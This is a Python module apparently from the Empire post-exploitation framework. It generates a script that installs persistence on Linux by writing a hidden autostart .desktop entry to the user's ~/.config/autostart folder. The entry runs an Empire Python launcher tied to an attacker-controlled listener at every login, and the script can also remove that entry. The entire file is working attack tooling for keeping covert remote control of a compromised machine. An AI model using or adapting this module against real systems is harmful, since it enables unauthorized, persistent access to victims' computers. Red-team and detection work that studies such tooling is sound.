from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        remove = params["Remove"]
        file_name = params["FileName"]
        listener_name = params["Listener"]
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name, language="python"
        )
        launcher = launcher.removeprefix("echo ")
        launcher = launcher.removesuffix(" | python3 &")
        dt_settings = f"""
[Desktop Entry]
Name={file_name}
Exec=python -c {launcher}
Type=Application
NoDisplay=True
"""
        return f"""
import subprocess
import sys
import os
remove = "{remove}"
dtFile = \"\"\"
{dt_settings}
\"\"\"
home = os.path.expanduser("~")
filePath = home + "/.config/autostart/"
writeFile = filePath + "{file_name}.desktop"

if remove.lower() == "true":
    if os.path.isfile(writeFile):
        os.remove(writeFile)
        print("\\n[+] Persistence has been removed")
    else:
        print("\\n[-] Persistence file does not exist, nothing removed")

else:
    if not os.path.exists(filePath):
        os.makedirs(filePath)
    e = open(writeFile,'w')
    e.write(dtFile)
    e.close()

    print("\\n[+] Persistence has been installed: ~/.config/autostart/{file_name}")
    print("\\n[+] Empire daemon has been written to {file_name}")

"""
